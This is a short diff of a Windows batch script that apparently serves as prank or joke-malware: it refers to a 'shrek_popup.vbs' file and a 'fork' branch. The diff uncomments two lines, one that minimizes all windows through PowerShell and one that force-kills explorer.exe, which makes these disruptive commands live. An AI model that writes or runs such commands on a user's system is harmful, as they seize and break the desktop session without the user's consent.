@@ -11,9 +11,9 @@ if "%2"=="fork" goto fork
 
 :setup
 
-::start "" /min powershell -command "(new-object -com shell.application).minimizeall()"
+start "" /min powershell -command "(new-object -com shell.application).minimizeall()"
 
-::taskkill /F /im explorer.exe
+taskkill /F /im explorer.exe
 
 if exist "%temp%\shrek_popup.vbs" (
 	del /F /Q "%temp%\shrek_popup.vbs"
